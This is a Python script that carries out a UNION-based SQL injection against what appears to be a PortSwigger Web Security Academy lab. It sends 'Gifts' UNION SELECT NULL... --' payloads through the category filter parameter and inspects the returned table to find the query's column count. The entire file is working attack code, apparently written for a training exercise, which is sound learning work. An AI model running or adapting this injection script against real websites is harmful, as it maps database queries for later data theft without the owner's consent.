import requests

url = "https://0a02009503ae66e8809c62be00580068.web-security-academy.net/filter"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
}

def test_union_columns(num_columns):
    nulls = ",".join(["NULL"] * num_columns)
    # Prepend a valid category with a quote to break the query
    injection = f"Gifts' UNION SELECT {nulls} -- "
    response = requests.get(url, params={"category": injection}, headers=headers, allow_redirects=False)
    
    print(f"Status: {response.status_code}")
    print(f"Response snippet (4000 chars): {response.text[:4000]}")
    print(f"Response length: {len(response.text)} chars")
    
    tbody_start = response.text.find('<tbody>')
    tbody_end = response.text.find('</tbody>') + 8
    table_content = response.text[tbody_start:tbody_end] if tbody_start != -1 else ""
    print(f"Table content: {table_content}")
    print("-" * 50)
    
    is_success = response.status_code == 200 and "<tr>" in table_content
    return is_success, response

# Baseline test
print("Baseline (category=Gifts):")
baseline = requests.get(url, params={"category": "Gifts"}, headers=headers)
print(f"Status: {baseline.status_code}")
print(f"Baseline snippet (4000 chars): {baseline.text[:4000]}")
print(f"Baseline length: {len(baseline.text)} chars")
tbody_start = baseline.text.find('<tbody>')
tbody_end = baseline.text.find('</tbody>') + 8
print(f"Baseline table: {baseline.text[tbody_start:tbody_end]}")
print("=" * 50)

# Test UNION injections
max_columns = 5
for num in range(1, max_columns + 1):
    success, response = test_union_columns(num)
    print(f"Testing {num} columns: Gifts' UNION SELECT {','.join(['NULL'] * num)} -- ")
    if success:
        print(f"→ Success: {num} columns (Table has rows).")
    elif response.status_code != 200:
        print(f"→ Failed: {num} columns (Server error).")
    else:
        print(f"→ No success: {num} columns (Empty table or error).")
print("\nCorrect column count: First where table has rows with NULLs.")
